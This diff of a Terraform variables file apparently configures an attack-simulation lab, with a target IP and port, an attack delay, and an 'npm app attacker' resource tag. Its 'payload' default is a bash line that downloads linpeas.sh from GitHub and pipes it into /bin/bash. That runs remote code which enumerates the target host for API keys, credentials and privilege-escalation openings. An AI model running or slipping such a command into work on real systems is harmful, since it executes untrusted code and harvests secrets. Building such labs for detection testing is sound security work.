@@ -15,37 +15,26 @@ variable "tag" {
 
 variable "timeout" {
   type = number
-  default = 1200
+  default = 3600
 }
 
 variable "cron" {
   type = string
-  default = "cron(0/30 * * * ? *)"
+  default = "cron(0 */1 * * ? *)"
 }
 
-variable "resource_query_exec_vuln_npm_app_attacker" {
-    type    = object({
-      ResourceTypeFilters = list(string)
-      TagFilters  = list(object({
-        Key = string
-        Values = list(string)
-      }))
-    })
-    description = "JSON query to idenfity resources which will have lacework deployed"
-    default = {
-                ResourceTypeFilters = [
-                    "AWS::EC2::Instance"
-                ]
+variable "payload" {
+  type = string
+  description = "The bash commands payload to execute when target machine connects"
+  default = <<-EOT
+            curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex
+            EOT
+}
 
-                TagFilters = [
-                    {
-                        Key = "ssm_exec_vuln_npm_app_attacker"
-                        Values = [
-                            "true"
-                        ]
-                    }
-                ]
-              }
+variable "attack_delay" {
+  type = number
+  description = "wait time between baseline and attack (default: 12 hours)"
+  default =  50400
 }
 
 variable "target_ip" {
@@ -56,12 +45,4 @@ variable "target_ip" {
 variable "target_port" {
   type = number
   description = "target port"
-}
-
-variable "payload" {
-  type = string
-  description = "bash payload to execute"
-  default =   <<-EOT
-              curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex
-              EOT
 }
